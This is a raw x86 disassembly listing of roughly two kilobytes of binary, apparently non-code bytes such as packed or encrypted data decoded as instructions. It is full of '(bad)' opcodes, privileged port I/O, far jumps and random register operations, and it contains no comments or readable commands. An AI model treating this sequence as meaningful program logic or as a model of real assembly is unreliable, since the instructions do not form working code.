  42125f:	xor    eax,esi
  421261:	ret    
  421262:	ror    BYTE PTR [edx],0x0
  421265:	adc    eax,0xc6d69296
  42126a:	add    eax,0xfc4198f
  42126f:	xchg   DWORD PTR gs:[edx+0x18],edx
  421273:	adc    al,0x7d
  421275:	call   0x6e1ed75
  42127a:	dec    esp
  42127b:	cmp    al,0xe3
  42127d:	shl    BYTE PTR [edi],1
  42127f:	fld    QWORD PTR [eax+0xbdff639]
  421285:	je     0x421278
  421287:	and    al,0xb3
  421289:	stos   BYTE PTR es:[edi],al
  42128a:	lds    ecx,FWORD PTR [edi-0x7]
  42128d:	jp     0x421283
  42128f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421290:	inc    edi
  421291:	jmp    0xe342:0xdce6cb04
  421298:	cmp    dl,BYTE PTR [ebp+0x6b325ee2]
  42129e:	(bad)  
  42129f:	daa    
  4212a0:	add    dl,BYTE PTR [eax+0x13275a8c]
  4212a6:	aam    0x4a
  4212a8:	cmp    ah,BYTE PTR [eax-0x55422367]
  4212ae:	jmp    0x8946702c
  4212b3:	jae    0x421258
  4212b5:	push   esp
  4212b6:	push   es
  4212b7:	dec    esp
  4212b8:	in     eax,0xf0
  4212ba:	(bad)  
  4212bb:	jmp    0xd7a7:0x905336c7
  4212c2:	cmp    al,0xf1
  4212c4:	add    ah,BYTE PTR [edi+0x54]
  4212c7:	sbb    al,bh
  4212c9:	jmp    0xcd6e:0x64732eef
  4212d0:	sub    BYTE PTR [esi],ch
  4212d2:	add    ah,cl
  4212d4:	jae    0x4212e2
  4212d6:	popa   
  4212d7:	sub    eax,0xd30e4fb7
  4212dc:	hlt    
  4212dd:	pushf  
  4212de:	xchg   ebx,eax
  4212df:	js     0x42127b
  4212e1:	or     BYTE PTR [esi+edi*2],al
  4212e4:	xor    BYTE PTR [eax],bl
  4212e6:	repz cmp eax,0x30ab41d9
  4212ec:	push   0x52ac128
  4212f1:	sbb    eax,0xd6e738f4
  4212f6:	aas    
  4212f7:	pushf  
  4212f8:	stc    
  4212f9:	jmp    0xca99657
  4212fe:	xor    al,0x70
  421300:	xor    bl,BYTE PTR [esi]
  421302:	inc    ecx
  421303:	hlt    
  421304:	adc    ebp,DWORD PTR [ebx*4+0x2609176a]
  42130b:	dec    esi
  42130c:	mov    al,0xb1
  42130e:	or     dh,cl
  421310:	in     eax,dx
  421311:	cwde   
  421312:	aam    0xa1
  421314:	adc    ecx,DWORD PTR [ebx+0x49f5ddec]
  42131a:	jecxz  0x421306
  42131c:	rcl    BYTE PTR [edi+0x42ba15bf],1
  421322:	mov    ah,0xd6
  421324:	jb     0x421380
  421326:	call   0x3c1a2246
  42132b:	rol    ch,cl
  42132d:	ins    BYTE PTR es:[edi],dx
  42132e:	je     0x4212b3
  421330:	adc    al,0x30
  421332:	sti    
  421333:	cli    
  421334:	sahf   
  421335:	sub    eax,DWORD PTR [ebx]
  421337:	loope  0x421345
  421339:	out    0xff,eax
  42133b:	(bad)  
  42133c:	scas   eax,DWORD PTR es:[edi]
  42133d:	mov    esp,0x6e7f6b62
  421342:	mov    al,0x6e
  421344:	(bad)  
  421345:	std    
  421346:	es leave 
  421348:	jae    0x42137e
  42134a:	js     0x42134c
  42134c:	or     cl,BYTE PTR [esp+edi*2]
  42134f:	mov    esi,0x6a8ed138
  421354:	jb     0x421372
  421356:	xchg   esp,eax
  421357:	push   0x1b
  421359:	pop    ss
  42135a:	retf   
  42135b:	pop    ss
  42135c:	out    dx,al
  42135d:	jae    0x4213dc
  42135f:	inc    ebp
  421360:	fs mov edi,0xc223857a
  421366:	int3   
  421367:	and    eax,DWORD PTR [esi+eiz*8]
  42136a:	push   esi
  42136b:	sbb    dh,BYTE PTR [esp+esi*8-0x48]
  42136f:	pop    ds
  421370:	xchg   edx,eax
  421371:	mov    eax,ds:0xc7997c05
  421376:	mov    ebx,0xec0d3eb9
  42137b:	pop    edx
  42137c:	sub    eax,0xd039143a
  421381:	sbb    DWORD PTR [ebx+0x6ea8e33c],esp
  421387:	adc    DWORD PTR [esi],esp
  421389:	sub    eax,0x840c3a86
  42138e:	bnd jns 0x4213fc
  421391:	mov    al,0x81
  421393:	xor    al,0xcf
  421395:	mov    al,ds:0x3f3f40e4
  42139a:	xchg   edx,eax
  42139b:	jbe    0x4213f5
  42139d:	es in  al,dx
  42139f:	sub    bh,BYTE PTR [ebx-0x203670c5]
  4213a5:	loope  0x4213b8
  4213a7:	sbb    DWORD PTR [ebx+esi*8],0x8b437341
  4213ae:	sar    bl,cl
  4213b0:	jno    0x421364
  4213b2:	push   edx
  4213b3:	retf   0x71f9
  4213b6:	daa    
  4213b7:	mov    esp,ebx
  4213b9:	(bad)  ds:0x1279d447
  4213bf:	mov    ds:0xd5132e23,al
  4213c4:	test   BYTE PTR ds:0x7df07398,al
  4213ca:	jae    0x4213f1
  4213cc:	in     eax,dx
  4213cd:	loopne 0x4213a9
  4213cf:	push   0x6f
  4213d1:	jmp    DWORD PTR [ebx-0x4c85680]
  4213d7:	lock jne 0x421443
  4213da:	mov    ds:0xf3563984,eax
  4213df:	test   al,0x27
  4213e1:	xchg   DWORD PTR [edi+0x57],edx
  4213e4:	daa    
  4213e5:	div    ebp
  4213e7:	jns    0x42143d
  4213e9:	cmp    bh,al
  4213eb:	xor    ah,bh
  4213ed:	dec    ebp
  4213ee:	arpl   WORD PTR [ebp-0x48],cx
  4213f1:	fild   QWORD PTR [edx]
  4213f3:	fwait
  4213f4:	outs   dx,DWORD PTR ds:[esi]
  4213f5:	push   0xffffff94
  4213f7:	push   ecx
  4213f8:	div    al
  4213fa:	push   esi
  4213fb:	sar    BYTE PTR [ebx-0x78],cl
  4213fe:	jb     0x421385
  421400:	inc    esp
  421401:	sbb    edi,ebp
  421403:	jns    0x421476
  421405:	aam    0x87
  421407:	(bad)  
  421408:	jns    0x421445
  42140a:	mov    dl,cl
  42140c:	mov    ch,0xf8
  42140e:	cwde   
  42140f:	xchg   esi,eax
  421410:	rcl    ebp,cl
  421412:	jl     0x42140c
  421414:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421415:	repz sbb edx,DWORD PTR [edx-0x5a599ab6]
  42141c:	lds    eax,FWORD PTR [edi]
  42141e:	xchg   ecx,eax
  42141f:	pop    eax
  421420:	push   ebx
  421421:	pushf  
  421422:	mov    WORD PTR [edx],fs
  421424:	test   al,0x9b
  421426:	mov    bh,0x9a
  421428:	cmp    eax,0xcf11af23
  42142d:	dec    ebp
  42142e:	jp     0x4213b5
  421430:	mov    gs,WORD PTR [eax+0xad263]
  421436:	ror    DWORD PTR [esi],cl
  421438:	pop    ds
  421439:	mov    WORD PTR [ecx+0x4c],cs
  42143c:	fisubr WORD PTR [edx+0x76]
  42143f:	pop    ss
  421440:	daa    
  421441:	(bad)  
  421442:	int    0x73
  421444:	hlt    
  421445:	lds    ecx,FWORD PTR [edi+0x7e]
  421448:	cld    
  421449:	out    0xeb,eax
  42144b:	push   ebx
  42144c:	mov    al,ds:0xd4de7a03
  421451:	ja     0x42149e
  421453:	sbb    BYTE PTR [eax-0x78870624],ch
  421459:	mov    ch,0xa
  42145b:	mov    edi,0x2f2dafc3
  421460:	sub    BYTE PTR [ebx],cl
  421462:	jge    0x4214d6
  421464:	mov    ch,0xc6
  421466:	mov    edx,?
  421468:	mov    esi,0xa33a36e8
  42146d:	adc    eax,0xe485dbdf
  421472:	repz loopne 0x4214d3
  421475:	sub    eax,0x880f1a56
  42147a:	dec    esi
  42147b:	xor    BYTE PTR [ebx+0x1a0b7abf],bl
  421481:	jg     0x421410
  421483:	dec    ecx
  421484:	sahf   
  421485:	cli    
  421486:	int    0x4a
  421488:	xchg   ebx,eax
  421489:	xlat   BYTE PTR ds:[ebx]
  42148a:	ret    0x2a51
  42148d:	ss ror ah,cl
  421490:	mov    ah,0x10
  421492:	bound  esp,QWORD PTR [esi]
  421494:	xchg   BYTE PTR [ebx+0x71],dl
  421497:	shl    ebx,1
  421499:	jns    0x421424
  42149b:	jmp    FWORD PTR [eax-0x7e7b82ff]
  4214a1:	sbb    dh,BYTE PTR [edx+ebx*1]
  4214a4:	mov    edi,0xd591d838
  4214a9:	fcmovb st,st(6)
  4214ab:	pushf  
  4214ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214ad:	in     eax,dx
  4214ae:	sub    eax,0xbfdbcf48
  4214b3:	fcomp  DWORD PTR [edi]
  4214b5:	xchg   ebx,eax
  4214b6:	xor    BYTE PTR [ecx],cl
  4214b8:	dec    ebp
  4214b9:	sbb    esp,edi
  4214bb:	push   es
  4214bc:	clc    
  4214bd:	loopne 0x4214f7
  4214bf:	push   eax
  4214c0:	sti    
  4214c1:	outs   dx,BYTE PTR ds:[esi]
  4214c2:	add    al,0x2c
  4214c4:	adc    BYTE PTR [edi-0x40a387b3],ah
  4214ca:	(bad)  
  4214cb:	xchg   esi,eax
  4214cc:	push   ebx
  4214cd:	lock mov al,ds:0x4a3c0ae
  4214d3:	pusha  
  4214d4:	or     al,0x9b
  4214d6:	and    al,0x5b
  4214d8:	cmp    dl,dh
  4214da:	xlat   BYTE PTR ds:[ebx]
  4214db:	lds    esp,FWORD PTR [esi]
  4214dd:	dec    ebx
  4214de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214df:	fdiv   QWORD PTR [edx-0x2b]
  4214e2:	pop    eax
  4214e3:	sub    eax,0x28e9dbf7
  4214e8:	in     eax,0xcc
  4214ea:	push   edx
  4214eb:	adc    DWORD PTR [ebp+0x2fd96b0a],ebx
  4214f1:	fwait
  4214f2:	inc    ebx
  4214f3:	pop    esp
  4214f4:	jbe    0x4214f6
  4214f6:	hlt    
  4214f7:	mov    edx,0x12727923
  4214fc:	add    eax,0xcd532644
  421501:	sub    BYTE PTR [esi],bl
  421503:	aas    
  421504:	ret    
  421505:	sbb    al,0x2
  421507:	retf   
  421508:	imul   eax,DWORD PTR [edi+0x4b],0x3e
  42150c:	push   es
  42150d:	sub    ebp,esi
  42150f:	pop    ecx
  421510:	or     eax,0x95677f91
  421515:	sti    
  421516:	dec    edx
  421517:	pop    esi
  421518:	and    bl,BYTE PTR [edi+0x69]
  42151b:	cdq    
  42151c:	jle    0x4214f7
  42151e:	daa    
  42151f:	xor    al,0x92
  421521:	mov    al,0x7d
  421523:	ja     0x421521
  421525:	jp     0x4214e6
  421527:	mov    esp,0x3bc45fd
  42152c:	jne    0x421552
  42152e:	add    al,0x9c
  421530:	scas   eax,DWORD PTR es:[edi]
  421531:	add    bh,BYTE PTR [ebp-0x7f18c9cb]
  421537:	inc    ebx
  421538:	out    0x30,al
  42153a:	pop    eax
  42153b:	hlt    
  42153c:	bound  edi,QWORD PTR [ecx]
  42153e:	xchg   ecx,eax
  42153f:	push   es
  421540:	bound  esi,QWORD PTR [ebx-0x38]
  421543:	pop    edi
  421544:	in     eax,0x84
  421546:	dec    ebx
  421547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421548:	and    al,0x27
  42154a:	mov    ch,0xc0
  42154c:	loop   0x42151d
  42154e:	inc    ebp
  42154f:	sbb    dh,BYTE PTR [ecx+esi*4+0x746bcfef]
  421556:	js     0x42153c
  421558:	pop    esi
  421559:	retf   
  42155a:	mov    ah,0x22
  42155c:	xchg   ebp,eax
  42155d:	idiv   BYTE PTR [ebp+0x0]
  421560:	fcomip st,st(1)
  421562:	pop    ss
  421563:	pop    ecx
  421564:	mov    edi,0x578f6421
  421569:	or     ch,BYTE PTR [edx+0x39df779d]
  42156f:	sbb    DWORD PTR [eax-0x4e9558b],ebp
  421575:	jns    0x4215b7
  421577:	sub    eax,0x90aa2fc2
  42157c:	push   0xeb35bb36
  421581:	repz scas eax,DWORD PTR es:[edi]
  421583:	repnz or al,0xb3
  421586:	pop    ss
  421587:	cmp    bh,BYTE PTR [eax]
  421589:	and    ch,BYTE PTR [eax-0x2f1dfbe1]
  42158f:	sti    
  421590:	sub    ebp,DWORD PTR [edx+0x37cdc9ba]
  421596:	aaa    
  421597:	sub    bh,BYTE PTR [eax-0x5798811b]
  42159d:	mov    al,0x67
  42159f:	inc    edx
  4215a0:	push   ebx
  4215a1:	repnz stc 
  4215a3:	add    eax,0x828ccaaf
  4215a8:	jbe    0x4215f5
  4215aa:	add    ch,0x2e
  4215ad:	lods   al,BYTE PTR ds:[esi]
  4215ae:	aam    0x9d
  4215b0:	and    esp,0x6d7816f5
  4215b6:	mov    ecx,0x57e9a3bd
  4215bb:	adc    DWORD PTR [ecx+0x4401e465],ecx
  4215c1:	xor    DWORD PTR [ebx-0x317dd3ff],eax
  4215c7:	sbb    eax,0x95900b0a
  4215cc:	arpl   WORD PTR [ecx+0x1d92210d],bx
  4215d2:	adc    al,0x2a
  4215d4:	jl     0x421590
  4215d6:	outs   dx,BYTE PTR ds:[esi]
  4215d7:	popf   
  4215d8:	loope  0x4215f0
  4215da:	lds    esp,FWORD PTR [edi-0x6f6ad2f0]
  4215e0:	popa   
  4215e1:	stos   DWORD PTR es:[edi],eax
  4215e2:	xor    bl,BYTE PTR [eax+0x32]
  4215e5:	cld    
  4215e6:	pop    esi
  4215e7:	push   es
  4215e8:	sub    ecx,DWORD PTR [ebx]
  4215ea:	mov    eax,ds:0xdd82af2d
  4215ef:	add    ebp,0x66
  4215f2:	mov    edx,0x650b3c4b
  4215f7:	xchg   ebp,eax
  4215f8:	xor    al,0x24
  4215fa:	push   eax
  4215fb:	inc    edi
  4215fc:	xchg   DWORD PTR [ecx-0x3eea52fd],esp
  421602:	sbb    BYTE PTR [esp+esi*8],0xed
  421606:	ins    BYTE PTR es:[edi],dx
  421607:	ror    DWORD PTR [esi+0x5c],cl
  42160a:	in     eax,dx
  42160b:	inc    esi
  42160c:	sbb    eax,0x9dc32039
  421611:	jne    0x42163b
  421613:	in     al,dx
  421614:	pop    edi
  421615:	lods   eax,DWORD PTR ds:[esi]
  421616:	and    al,0x3a
  421618:	je     0x42159e
  42161a:	inc    ebp
  42161b:	inc    ebx
  42161c:	call   0x16c8f9fa
  421621:	test   al,0x2c
  421623:	dec    eax
  421624:	icebp  
  421625:	cmp    DWORD PTR [ecx],esp
  421627:	mov    sp,0x812c
  42162b:	fistp  WORD PTR [ebp+0x527f5831]
  421631:	icebp  
  421632:	mov    DWORD PTR [esi-0x59],edi
  421635:	mov    ah,0x18
  421637:	call   0x2d24:0xf3dbe965
  42163e:	mov    ah,0x8a
  421640:	pop    ss
  421641:	cwde   
  421642:	pushf  
  421643:	pmaxsw mm0,mm5
  421646:	jecxz  0x42166f
  421648:	ret    0x6eff
  42164b:	rol    ecx,0xd6
  42164e:	mov    esi,0x2bb02713
  421653:	shl    ch,1
  421655:	call   0xed78:0x257ef3cf
  42165c:	mov    edi,0x87cfa62a
  421661:	imul   eax,DWORD PTR [edx-0x38],0x5f6addaf
  421668:	dec    esi
  421669:	mov    dl,0xef
  42166b:	add    BYTE PTR [esi+0x435979a7],cl
  421671:	push   ss
  421672:	ins    BYTE PTR es:[edi],dx
  421673:	cmp    ebp,0x2255f6b3
  421679:	push   ss
  42167a:	push   cs
  42167b:	fidivr DWORD PTR [ebp+0x5d8f2277]
  421681:	aad    0x77
  421683:	inc    esp
  421684:	(bad)  
  421685:	jo     0x421668
  421687:	mov    bh,0x88
  421689:	add    ebx,ecx
  42168b:	xor    DWORD PTR [ebp-0x22752d93],esp
  421691:	or     ch,BYTE PTR [ecx-0x3641090a]
  421697:	push   ss
  421698:	xchg   esp,eax
  421699:	repnz xlat BYTE PTR ds:[ebx]
  42169b:	jb     0x421623
  42169d:	xor    DWORD PTR [edx-0x35],ebp
  4216a0:	sti    
  4216a1:	ror    DWORD PTR [ebx-0x21],0xaa
  4216a5:	dec    eax
  4216a6:	lock mov esp,0xc9b545e
  4216ac:	stos   BYTE PTR es:[edi],al
  4216ad:	inc    eax
  4216ae:	fild   QWORD PTR [eax+edi*2]
  4216b1:	sahf   
  4216b2:	mov    ds:0x541306aa,al
  4216b7:	aaa    
  4216b8:	sar    ch,0xe8
  4216bb:	mov    ebp,0xbab01706
  4216c0:	push   edi
  4216c1:	push   esp
  4216c2:	lods   al,BYTE PTR ds:[esi]
  4216c3:	push   esp
  4216c4:	lods   eax,DWORD PTR ds:[esi]
  4216c5:	fisttp QWORD PTR [eax+eiz*2-0x150420e6]
  4216cc:	mov    al,ds:0xe2a56274
  4216d1:	inc    esp
  4216d2:	inc    ebx
  4216d3:	mov    al,0x51
  4216d5:	adc    DWORD PTR [edi-0x2a8446c8],edx
  4216db:	cmp    al,0x1b
  4216dd:	pushf  
  4216de:	mov    ds,WORD PTR [esi+0x12945581]
  4216e4:	jno    0x421693
  4216e6:	jecxz  0x421722
  4216e8:	retf   
  4216e9:	loop   0x421675
  4216eb:	pop    ss
  4216ec:	xchg   DWORD PTR [esi-0x2b],eax
  4216ef:	ror    DWORD PTR [ebp-0x62],0xfe
  4216f3:	cld    
  4216f4:	mov    dl,0x24
  4216f6:	mov    dl,0xb5
  4216f8:	sbb    al,0xe
  4216fa:	out    0x9d,eax
  4216fc:	add    DWORD PTR [ecx],esi
  4216fe:	fucomp st(0)
  421700:	jp     0x421708
  421702:	adc    BYTE PTR [eax+0x69],dh
  421705:	mov    eax,ds:0x922ec27e
  42170a:	xchg   edi,eax
  42170b:	and    al,0x4d
  42170d:	lods   eax,DWORD PTR ds:[esi]
  42170e:	shl    DWORD PTR [eax+0x22],0x93
  421712:	push   ebx
  421713:	repnz cdq 
  421715:	leave  
  421716:	leave  
  421717:	mov    dh,0x19
  421719:	ret    0x9bd1
  42171c:	clc    
  42171d:	gs in  al,dx
  42171f:	push   esi
  421720:	jle    0x4216cc
  421722:	mov    eax,ds:0x82a1e17b
  421727:	push   esi
  421728:	rcr    BYTE PTR [ebx-0x15107ffe],cl
  42172e:	loopne 0x42173e
  421730:	jge    0x421726
  421732:	jno    0x4216d0
  421734:	push   0x46
  421736:	fst    st(2)
  421738:	movq   mm7,mm1
  42173b:	repz fcomi st,st(5)
  42173e:	mov    cl,0x26
  421740:	dec    ebp
  421741:	inc    ecx
  421742:	mov    ds:0xd6a84010,eax
  421747:	sub    ecx,DWORD PTR [ebx]
  421749:	imul   ebp,eax,0x7
  42174c:	rcr    DWORD PTR [ecx],1
  42174e:	rol    DWORD PTR [eax+edi*1+0x62f2e9d3],1
  421755:	test   eax,0x247c32bd
  42175a:	out    dx,al
  42175b:	repnz or al,0x6d
  42175e:	out    dx,al
  42175f:	and    BYTE PTR [edx+0x726646f7],bl
  421765:	in     al,dx
  421766:	sbb    ch,BYTE PTR [ebx]
  421768:	test   al,0xad
  42176a:	push   cs
  42176b:	xchg   edi,ebp
  42176d:	inc    esi
  42176e:	mov    dl,0x5c
  421770:	or     DWORD PTR [edx],esp
  421772:	mov    ds:0x6517fdfb,al
  421777:	dec    esi
  421778:	cs push 0x4232a78a
  42177e:	dec    ebp
  42177f:	test   BYTE PTR [esi-0x1a6d1c72],0x3
  421786:	ret    
  421787:	repnz in eax,0x4b
  42178a:	into   
  42178b:	das    
  42178c:	mov    ecx,?
  42178e:	push   ebp
  42178f:	out    dx,eax
  421790:	ds or  al,0x75
  421793:	lods   eax,DWORD PTR ds:[esi]
  421794:	jle    0x4217a4
  421796:	lock fincstp 
  421799:	xchg   DWORD PTR [esi+ebp*8+0x7a],eax
  42179d:	sbb    bl,BYTE PTR [ebp-0x4a]
  4217a0:	cli    
  4217a1:	dec    eax
  4217a2:	stos   BYTE PTR es:[edi],al
  4217a3:	pop    ebx
  4217a4:	and    dl,BYTE PTR [edx-0x23a2545b]
  4217aa:	fs arpl sp,dx
  4217ad:	adc    BYTE PTR [ecx],bl
  4217af:	fimul  DWORD PTR [esi-0x1a18cd55]
  4217b5:	repnz inc esp
  4217b7:	pop    DWORD PTR [ecx-0x75ca1a19]
  4217bd:	push   0x3509af26
  4217c2:	add    edx,DWORD PTR [edx-0x230795a2]
  4217c8:	clc    
  4217c9:	xchg   edx,eax
  4217ca:	push   cs
  4217cb:	jle    0x42179a
  4217cd:	and    al,0x94
  4217cf:	adc    DWORD PTR [esi-0x650f278c],ebp
  4217d5:	push   ebp
  4217d6:	mov    DWORD PTR [ebx+0x246864b8],edx
  4217dc:	sbb    al,bh
  4217de:	(bad)  
  4217e0:	xchg   esi,eax
  4217e1:	xor    DWORD PTR [ecx],0x7887665f
  4217e7:	(bad)  
  4217e8:	sub    ah,BYTE PTR ds:0x25b5e32b
  4217ee:	std    
  4217ef:	sar    edi,cl
  4217f1:	mov    cl,0x15
  4217f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217f4:	into   
  4217f5:	out    0x10,eax
  4217f7:	ret    
  4217f8:	pop    ebp
  4217f9:	mov    DWORD PTR [edi],esi
  4217fb:	out    dx,al
  4217fc:	repnz les ebp,FWORD PTR [ebp-0x27]
  421800:	inc    edx
  421801:	not    DWORD PTR [ebx]
  421803:	dec    ebp
  421804:	or     BYTE PTR [esi+eiz*2-0x6c],al
  421808:	gs fdiv st,st(7)
  42180b:	jle    0x42188b
  42180d:	push   ebp
  42180e:	ins    DWORD PTR es:[edi],dx
  42180f:	pusha  
  421810:	ficomp WORD PTR [edx+edi*2+0x1c59d78d]
  421817:	inc    edi
  421818:	fld    DWORD PTR es:[edx+0xb4c660e]
  42181f:	xchg   esi,eax
  421820:	mov    ebx,0x3ff204f5
  421825:	xchg   edx,eax
  421826:	mov    al,ds:0x78bba2bd
  42182b:	ja     0x421855
  42182d:	dec    ecx
  42182e:	xchg   esi,eax
  42182f:	in     eax,dx
  421830:	mov    dx,WORD PTR [ebx+0x38]
  421834:	push   ebp
  421835:	in     al,0xf0
  421837:	(bad)  
  421839:	jle    0x4217ed
  42183b:	(bad)  
  42183c:	ss mov eax,0xc4f531a
  421842:	push   ebp
  421843:	mov    dl,0xb7
  421845:	cli    
  421846:	pop    eax
  421847:	adc    al,0x79
  421849:	fbstp  TBYTE PTR [esi]
  42184b:	cdq    
  42184c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42184d:	(bad)
  421850:	jmp    0x4217e5
  421852:	cmc    
  421853:	(bad)  
  421854:	out    0xb9,eax
  421856:	inc    ebx
  421857:	sub    cl,dl
  421859:	jbe    0x4218c7
  42185b:	pop    edx
  42185c:	xchg   edi,eax
  42185d:	jo     0x4218be
  42185f:	adc    bh,BYTE PTR [edi+esi*8]
  421862:	dec    esi
  421863:	cmp    eax,DWORD PTR ds:0x2ed60d93
  421869:	push   ecx
  42186a:	das    
  42186b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42186c:	xchg   ebp,eax
  42186d:	jo     0x4218c2
  42186f:	hlt    
  421870:	adc    BYTE PTR [esi+0x35bcd340],bh
  421876:	jge    0x4218c6
  421878:	bound  ebp,QWORD PTR [edi+0x222083fe]
  42187e:	pop    ecx
  42187f:	rcl    BYTE PTR [edi],0x45
  421882:	or     BYTE PTR [ecx+0xf],dh
  421885:	cdq    
  421886:	jne    0x42188c
  421888:	rcr    DWORD PTR cs:[ebp+0x43055ec0],cl
  42188f:	mov    eax,ds:0xde0c9150
  421894:	or     BYTE PTR [eax],ah
  421896:	mov    DWORD PTR [ecx-0x5fbb080e],ebx
  42189c:	outs   dx,DWORD PTR ds:[esi]
  42189d:	dec    esi
  42189e:	imul   esp,DWORD PTR [esi+0x22],0x85eac868
  4218a5:	scas   eax,DWORD PTR es:[edi]
  4218a6:	repnz push ebx
  4218a8:	test   BYTE PTR [ecx],0x80
  4218ab:	aaa    
  4218ac:	pushf  
  4218ad:	arpl   WORD PTR ds:0xf909916c,di
  4218b3:	in     eax,dx
  4218b4:	push   0x51df890d
  4218b9:	mov    ds:0xe5f4d0df,eax
  4218be:	int3   
  4218bf:	test   eax,0x24ff4458
  4218c4:	scas   al,BYTE PTR es:[edi]
  4218c5:	stos   DWORD PTR es:[edi],eax
  4218c6:	outs   dx,BYTE PTR ds:[esi]
  4218c7:	jecxz  0x42187c
  4218c9:	mov    al,ds:0x195a114a
  4218ce:	(bad)  
  4218cf:	int    0x6e
  4218d1:	jnp    0x4218ac
  4218d3:	stc    
  4218d4:	out    dx,al
  4218d5:	lahf   
  4218d6:	mov    ch,0x77
  4218d8:	call   0x35c0c053
  4218dd:	xor    al,0x8d
  4218df:	fwait
  4218e0:	and    al,0x17
  4218e2:	rcl    DWORD PTR [ebp-0x70],1
  4218e5:	ds jno 0x42187b
  4218e8:	dec    esi
  4218e9:	inc    edi
  4218ea:	inc    ebp
  4218eb:	inc    ecx
  4218ec:	sbb    al,0x2c
  4218ee:	lods   al,BYTE PTR ds:[esi]
  4218ef:	jb     0x421925
  4218f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218f2:	and    eax,0xa46821
  4218f7:	cmp    al,0xd0
  4218f9:	shl    edx,1
  4218fb:	pop    ds
  4218fc:	mov    eax,ds:0xd2a11cc
  421901:	inc    ecx
  421902:	jae    0x4218b3
  421904:	mov    dh,0x9b
  421906:	shl    dl,1
  421908:	inc    ebx
  421909:	dec    edx
  42190a:	push   ecx
  42190b:	fsub   DWORD PTR [eax+ecx*1-0x73e15804]
  421912:	jl     0x4218cc
  421914:	jmp    0x91cd:0x5daf78d1
  42191b:	aas    
  42191c:	test   BYTE PTR [ecx],ah
  42191e:	fcmovne st,st(6)
  421920:	pop    eax
  421921:	popa   
  421922:	adc    al,0x18
  421924:	outs   dx,BYTE PTR ds:[esi]
  421925:	pop    esp
  421926:	mov    edx,0x3ff13bc3
  42192b:	test   eax,0x5ba5e1e4
  421930:	sbb    edi,edx
  421932:	in     al,dx
  421933:	lods   eax,DWORD PTR ds:[esi]
  421934:	or     esp,DWORD PTR ds:0x6d5ec325
  42193a:	xchg   BYTE PTR [edi+0x7a131582],al
  421940:	pop    DWORD PTR [ebx]
  421942:	adc    cl,bl
  421944:	xchg   edi,eax
  421945:	cwde   
  421946:	sub    al,0xe9
  421948:	ret    
  421949:	pusha  
  42194a:	push   esi
  42194b:	popf   
  42194c:	es xchg edi,eax
  42194e:	into   
  42194f:	cmp    DWORD PTR [esi+0x23],ebp
  421952:	outs   dx,BYTE PTR ds:[esi]
  421953:	int3   
  421954:	push   esp
  421955:	call   0xec52:0x7bb13c50
  42195c:	js     0x4219ae
  42195e:	push   cs
  42195f:	enter  0x100d,0xe7
  421963:	or     BYTE PTR [edi],bh
  421965:	adc    DWORD PTR [ebx-0x62ffa2b1],ebx
  42196b:	out    0x1e,al
  42196d:	leave  
  42196e:	cmp    eax,esi
  421970:	aas    
  421971:	jno    0x4219eb
  421973:	mov    bl,0xa2
  421975:	cwde   
  421976:	jp     0x421916
  421978:	push   es
  421979:	scas   eax,DWORD PTR es:[edi]
  42197a:	dec    ebp
  42197b:	mov    ds:0xd470d468,al
  421980:	(bad)  [ebx-0x1a]
  421983:	push   cs
  421984:	pop    esp
  421985:	cmc    
  421986:	jne    0x421960
  421988:	jo     0x421925
  42198a:	mov    edi,0x90998068
  42198f:	js     0x4219b9
  421991:	pop    esi
  421992:	aam    0x63
  421994:	xchg   ecx,eax
  421995:	aaa    
  421996:	dec    ebp
  421997:	xchg   edi,eax
  421998:	out    dx,eax
  421999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42199a:	ret    
  42199b:	cmp    eax,0x7b3e158e
  4219a0:	shl    BYTE PTR [edx+ebx*8-0x3b765647],cl
  4219a7:	(bad)  
  4219a8:	sub    DWORD PTR [esi-0x2],edx
  4219ab:	dec    edi
  4219ac:	cmp    al,0x49
  4219ae:	popf   
  4219af:	bound  edx,QWORD PTR [edi]
  4219b1:	fisttp DWORD PTR [edx-0x72]
  4219b4:	xchg   esp,eax
  4219b5:	jp     0x42197d
  4219b7:	fiadd  DWORD PTR [ebp+0xe]
  4219ba:	mov    esp,ebx
  4219bc:	call   0x2f20:0x5984eace
  4219c3:	nop
  4219c4:	push   cs
  4219c5:	retf   
  4219c6:	rcr    DWORD PTR [ecx],cl
  4219c8:	pop    ebx
  4219c9:	mov    ds:0x140d803e,al
  4219ce:	adc    DWORD PTR [ecx-0x569982ff],ebx
  4219d4:	and    dl,BYTE PTR [esi+0x8571105]
  4219da:	aad    0x2c
  4219dc:	loop   0x421986
  4219de:	je     0x4219c5
  4219e0:	in     eax,0x69
  4219e2:	sbb    DWORD PTR [esi],0x8
  4219e5:	(bad)  
  4219e6:	loope  0x4219b7
  4219e8:	jmp    0xf7da4d9a
  4219ed:	jmp    0x4219ba
  4219ef:	fstp   st(5)
  4219f1:	pushf  
  4219f2:	or     al,BYTE PTR [ecx]
  4219f4:	arpl   bp,di
  4219f6:	push   esp
  4219f7:	(bad)  
  4219f8:	xchg   ebx,eax
  4219f9:	xchg   DWORD PTR [ecx],eax
  4219fb:	adc    cl,0x7b
  4219fe:	jae    0x4219fb
  421a00:	sub    ebx,0xffffffbe
  421a03:	out    dx,al
  421a04:	ret    
  421a05:	ins    DWORD PTR es:[edi],dx
  421a06:	mov    ebp,ebx
  421a08:	popa   
  421a09:	jb     0x421a6e
  421a0b:	pop    dx
  421a0d:	rcl    DWORD PTR [ebp+0x18fe23b4],cl
  421a13:	pop    ebp
  421a14:	je     0x4219db
  421a16:	lahf   
  421a17:	ror    DWORD PTR [ebx-0x28],1
  421a1a:	inc    ebp
  421a1b:	dec    ebp
  421a1c:	shl    DWORD PTR [eax-0x68606660],0xa7
  421a23:	in     al,0x8c
  421a25:	call   0xadb1:0xce260e44
  421a2c:	jge    0x4219cb
  421a2e:	scas   eax,DWORD PTR es:[edi]
  421a2f:	in     al,0x99
  421a31:	jae    0x4219ec
  421a33:	sub    esp,eax
  421a35:	push   ebx
  421a36:	push   0x1871a15d
  421a3b:	jnp    0x421a8a
